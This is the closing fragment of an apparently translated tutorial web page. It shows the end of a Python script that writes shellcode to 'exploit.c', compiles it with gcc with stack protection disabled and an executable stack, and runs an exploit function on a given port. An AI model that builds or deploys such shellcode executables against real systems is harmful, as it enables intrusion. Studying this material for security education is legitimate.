"exploit.c"<br/>    outfile = open(filename, 'w')<br/>    outfile.write(outShellcode)<br/>    outfile.close()</span><span id="1126" class="mt jr it mo b gy my mv l mw mx">print "[INFO] Creating File: exploit.c"</span><span id="6a68" class="mt jr it mo b gy my mv l mw mx"># Compiling shellcode.c<br/>    subprocess.call(["gcc", "-fno-stack-protector", "-z", "execstack", filename, "-o", "exploit", "-w"])<br/>    print "[INFO] Compiled Executable: exploit"</span><span id="5b5c" class="mt jr it mo b gy my mv l mw mx">if __name__ == "__main__":<br/>    inputPort = args.port if args.port != None else error()</span><span id="b86c" class="mt jr it mo b gy my mv l mw mx">exploit(inputPort)</span></pre><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="na nb di nc bf nd"><div class="gh gi og"><img src="../Images/33476025cf7ecbbbfb9bc0753773129c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LB5zNyEzIAmZDbcCBEUiRg.png"/></div></div></figure><p id="5b9c" class="pw-post-body-paragraph ko kp it kq b kr mc kt ku kv md kx ky kz mf lb lc ld mh lf lg lh mj lj lk ll im bi translated">感谢阅读！</p></div></div>    
</body>
</html>